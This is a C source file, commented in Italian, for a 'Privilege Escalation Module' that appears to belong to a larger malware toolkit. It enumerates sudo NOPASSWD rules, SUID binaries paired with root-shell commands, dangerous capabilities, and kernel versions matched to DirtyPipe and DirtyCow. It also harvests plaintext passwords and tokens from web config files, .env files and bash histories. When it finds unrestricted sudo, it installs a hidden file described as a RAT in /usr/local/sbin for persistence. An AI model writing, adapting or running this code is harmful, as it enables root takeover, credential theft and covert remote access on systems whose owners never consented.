#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>

/* ── Privilege Escalation Module ─────────────────────────────
 * Enumera vettori di privesc in ordine di priorità:
 * 1. Sudo misconfiguration (meno rumoroso)
 * 2. SUID binary abuse
 * 3. Linux capabilities
 * 4. Kernel version (CVE lookup)
 * 5. Credenziali in file di config
 */

/* ── Vettore 1: Sudo Misconfiguration ───────────────────────
 * Controlla se l'utente può eseguire comandi come root
 * senza password tramite sudo
 */
int check_sudo() {
    FILE *fp = popen("sudo -n -l 2>/dev/null", "r");
    if (!fp) return 0;

    char buf[1024];
    int found = 0;

    /* Tool abusabili via sudo per ottenere shell root */
    const char *abusable[] = {
        "python3", "python", "perl", "ruby",
        "vim", "vi", "nano", "less", "more",
        "find", "awk", "nmap", "bash", "sh",
        "env", "tee", "cp", "chmod",
        NULL
    };

    while (fgets(buf, sizeof(buf), fp)) {
        for (int i = 0; abusable[i]; i++) {
            if (strstr(buf, abusable[i]) && strstr(buf, "NOPASSWD")) {
                printf("[+] Sudo NOPASSWD trovato: %s", buf);
                found = 1;
            }
        }
        /* (ALL) NOPASSWD: ALL — jackpot */
        if (strstr(buf, "NOPASSWD") && strstr(buf, "ALL")) {
            printf("[+] SUDO NOPASSWD ALL — escalation immediata!\n");
            found = 2;
        }
    }
    pclose(fp);
    return found;
}

/* ── Vettore 2: SUID Binary Abuse ───────────────────────────
 * Trova binari SUID e verifica se sono abusabili
 * Logica basata su GTFOBins
 */
typedef struct {
    const char *binary;
    const char *exploit_cmd;
} suid_entry_t;

static suid_entry_t suid_table[] = {
    { "python3",  "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" },
    { "python",   "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" },
    { "perl",     "perl -e 'use POSIX; setuid(0); exec \"/bin/bash\"'" },
    { "find",     "find . -exec /bin/bash \\; -quit" },
    { "vim",      "vim -c ':!/bin/bash'" },
    { "bash",     "bash -p" },
    { "cp",       NULL }, /* cp può sovrascrivere /etc/passwd */
    { "chmod",    NULL }, /* chmod può rendere scrivibile /etc/shadow */
    { NULL, NULL }
};

int check_suid() {
    DIR *dir;
    struct dirent *entry;
    struct stat st;
    char path[512];
    int found = 0;

    /* Cerca in /usr/bin e /bin */
    const char *dirs[] = { "/usr/bin", "/bin", "/usr/local/bin", NULL };

    for (int d = 0; dirs[d]; d++) {
        dir = opendir(dirs[d]);
        if (!dir) continue;

        while ((entry = readdir(dir)) != NULL) {
            snprintf(path, sizeof(path), "%s/%s", dirs[d], entry->d_name);
            if (stat(path, &st) == 0 && (st.st_mode & S_ISUID)) {
                /* Controlla se è nella nostra tabella di exploit */
                for (int i = 0; suid_table[i].binary; i++) {
                    if (strcmp(entry->d_name, suid_table[i].binary) == 0) {
                        printf("[+] SUID abusabile trovato: %s\n", path);
                        if (suid_table[i].exploit_cmd)
                            printf("    Exploit: %s\n", suid_table[i].exploit_cmd);
                        found = 1;
                    }
                }
            }
        }
        closedir(dir);
    }
    return found;
}

/* ── Vettore 3: Linux Capabilities ──────────────────────────
 * Cerca binari con capabilities pericolose
 */
int check_capabilities() {
    FILE *fp = popen("getcap -r / 2>/dev/null", "r");
    if (!fp) return 0;

    char buf[512];
    int found = 0;
    const char *dangerous[] = {
        "cap_setuid", "cap_net_raw", "cap_dac_override",
        "cap_sys_admin", "cap_sys_ptrace", NULL
    };

    while (fgets(buf, sizeof(buf), fp)) {
        for (int i = 0; dangerous[i]; i++) {
            if (strstr(buf, dangerous[i])) {
                printf("[+] Capability pericolosa trovata: %s", buf);
                found = 1;
            }
        }
    }
    pclose(fp);
    return found;
}

/* ── Vettore 4: Kernel Version ───────────────────────────────
 * Mostra versione kernel e segnala CVE noti
 * L'operatore può cercare exploit specifici per questa versione
 */
int check_kernel() {
    FILE *fp = popen("uname -r", "r");
    if (!fp) return 0;

    char kernel[256] = {0};
    if (fgets(kernel, sizeof(kernel), fp))
        kernel[strcspn(kernel, "\n")] = 0;
    pclose(fp);

    printf("[*] Kernel: %s\n", kernel);

    /* CVE noti per kernel vulnerabili */
    typedef struct { const char *ver_prefix; const char *cve; const char *name; } cve_t;
    static cve_t cves[] = {
        { "5.8",  "CVE-2022-0847", "DirtyPipe — sovrascrittura file read-only" },
        { "5.10", "CVE-2022-0847", "DirtyPipe — sovrascrittura file read-only" },
        { "5.11", "CVE-2022-0847", "DirtyPipe — sovrascrittura file read-only" },
        { "5.15", "CVE-2022-0847", "DirtyPipe — sovrascrittura file read-only" },
        { "4.",   "CVE-2016-5195", "DirtyCow — race condition write-anywhere" },
        { "3.",   "CVE-2016-5195", "DirtyCow — race condition write-anywhere" },
        { NULL, NULL, NULL }
    };

    int found = 0;
    for (int i = 0; cves[i].ver_prefix; i++) {
        if (strncmp(kernel, cves[i].ver_prefix, strlen(cves[i].ver_prefix)) == 0) {
            printf("[+] Possibile CVE: %s — %s\n", cves[i].cve, cves[i].name);
            found = 1;
        }
    }
    if (!found)
        printf("[-] Nessun CVE noto mappato per questa versione\n");

    return found;
}

/* ── Vettore 5: Credenziali in file di config ────────────────
 * Cerca password in chiaro in file comuni di configurazione
 * web e di sistema
 */
int check_credentials() {
    const char *paths[] = {
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/.env",
        "/var/www/html/config/database.php",
        "/var/www/secure_portal/www/config.php",
        "/var/www/secure_portal/www/.env",
        "/etc/mysql/debian.cnf",
        "/root/.bash_history",
        "/home/*/.bash_history",
        NULL
    };

    /* Keyword che indicano credenziali */
    const char *keywords[] = {
        "password", "passwd", "DB_PASS", "db_pass",
        "secret", "credential", "token", "api_key",
        NULL
    };

    int found = 0;
    printf("[*] Ricerca credenziali in file di config:\n");

    for (int i = 0; paths[i]; i++) {
        FILE *fp = fopen(paths[i], "r");
        if (!fp) continue;

        char buf[512];
        int lineno = 0;
        while (fgets(buf, sizeof(buf), fp)) {
            lineno++;
            for (int k = 0; keywords[k]; k++) {
                if (strcasestr(buf, keywords[k])) {
                    /* Rimuovi newline */
                    buf[strcspn(buf, "\n")] = 0;
                    printf("[+] %s:%d → %s\n", paths[i], lineno, buf);
                    found = 1;
                    break;
                }
            }
        }
        fclose(fp);
    }

    /* Cerca anche in /var/www ricorsivamente con grep */
    FILE *gp = popen(
        "grep -r --include='*.php' --include='*.env' --include='*.conf' "
        "-l 'password\\|DB_PASS\\|secret' /var/www 2>/dev/null | head -10",
        "r");
    if (gp) {
        char buf[512];
        while (fgets(buf, sizeof(buf), gp)) {
            buf[strcspn(buf, "\n")] = 0;
            printf("[+] File con credenziali: %s\n", buf);
            found = 1;
        }
        pclose(gp);
    }

    if (!found)
        printf("[-] Nessuna credenziale trovata\n");

    return found;
}

/* ── Escalation automatica via sudo ─────────────────────────
 * Se sudo NOPASSWD ALL è disponibile, esegue comando come root
 */
int escalate_sudo(const char *cmd) {
    char full_cmd[512];
    snprintf(full_cmd, sizeof(full_cmd), "sudo %s", cmd);
    return system(full_cmd);
}

/* ── Main ────────────────────────────────────────────────────  */
int main() {
    printf("[*] Privilege Escalation Module\n");
    printf("[*] Enumerazione vettori...\n\n");

    int sudo_result  = check_sudo();
    int suid_result  = check_suid();
    int caps_result  = check_capabilities();
    int kern_result  = check_kernel();
    int cred_result  = check_credentials();

    printf("\n[*] Riepilogo:\n");
    printf("    Sudo misconfiguration: %s\n", sudo_result ? "TROVATO" : "no");
    printf("    SUID abusabile:        %s\n", suid_result ? "TROVATO" : "no");
    printf("    Capabilities:          %s\n", caps_result ? "TROVATO" : "no");
    printf("    Kernel CVE:            %s\n", kern_result ? "POSSIBILE" : "no");
    printf("    Credenziali:           %s\n", cred_result ? "TROVATO" : "no");

    /* Tenta escalation automatica se sudo è disponibile */
    if (sudo_result == 2) {
        printf("\n[*] Tentativo escalation automatica via sudo...\n");
        printf("[*] Verifica UID corrente:\n");
        escalate_sudo("id");
        printf("[*] Installo RAT come root per persistenza privilegiata...\n");
        escalate_sudo("cp /tmp/.sysd /usr/local/sbin/.sysd");
        escalate_sudo("chmod +x /usr/local/sbin/.sysd");
        printf("[+] RAT installato in /usr/local/sbin/.sysd\n");
    }

    return 0;
}
